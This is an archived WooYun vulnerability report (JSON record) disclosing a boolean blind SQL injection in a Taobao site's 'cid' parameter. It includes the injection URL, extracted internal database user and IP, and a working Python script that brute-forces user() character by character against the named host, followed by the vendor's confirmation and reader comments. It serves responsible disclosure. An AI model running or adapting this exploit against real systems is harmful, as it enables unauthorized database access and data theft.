{"id": 48186, "wybug_id": "wooyun-2014-083899", "wybug_title": "淘宝网某站点存在MySQL注射(附验证脚本)", "wybug_corp": "阿里巴巴", "wybug_author": "lijiejie", "wybug_date": "2014-11-19 20:51", "wybug_open_date": "2015-01-03 20:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向公众公开  简要描述： 淘宝网某站点一处MySQL注射(附验证脚本) 详细说明：  注入点：\nhttp://top.lz.taobao.com/index.html?cfname=%E5%A5%B3%E4%BA%BA/%E5%A5%B3%E8%A3%85/%E7%AE%B1%E5%8C%85&cname=%E5%A5%B3%E8%A3%85/%E5%A5%B3%E5%A3%AB%E7%B2%BE%E5%93%81&dtype=10&level=all&locale=all&more=main&qtype=51a&cid=16 AND length(user())=21\n参数cid可注入，MySQL bool blind。 出现韩都衣舍时为True。   漏洞证明：  猜解user()，得到：\nlzstat@172.24.162.105\n当前库：dp_rank_new\n\n验证脚本附上：\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {}payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')print '[%s]Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())user = ''base_url = \"/index.html?cfname=%E5%A5%B3%E4%BA%BA/%E5%A5%B3%E8%A3%85/%E7%AE%B1%E5%8C%85&\" + \\      \"cname=%E5%A5%B3%E8%A3%85/%E5%A5%B3%E5%A3%AB%E7%B2%BE%E5%93%81&\" + \\      \"dtype=10&level=all&locale=all&more=main&qtype=51a&\"for i in range(1,22):    for payload in payloads:        conn = httplib.HTTPConnection('top.lz.taobao.com', timeout=60)        s = \"cid=16 AND ascii(mid(user()from(%s)for(1)))=%s\" % (i, ord(payload))        conn.request(method='GET',                     url = base_url + s,                     headers=headers)        html_doc = conn.getresponse().read().decode('utf-8')        conn.close()        if html_doc.find(u'卖家：韩都衣舍旗舰店') > 0:    # True            user += payload            sys.stdout.write('\\r[In Progress]' + user)            sys.stdout.flush()            break        else:            print '.',print '\\n[Done]MySQL user is ' + userprint time.strftime('%H:%M:%S', time.localtime())\n   修复方案：  过滤或转换   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-11-20 13:38 厂商回复： 感谢你对我们的支持与关注，该问题我们正在修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-20 14:23 |    \t\tZombiecc \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | just for fun.)\t\t \n  .............(不说话)    \n     2014-12-23 21:42 |    \t\t风之传说 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:28        | 借用朋友的一句话，你的时间在哪里，你的成...)\t\t \n  一看附脚本就知道是你。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}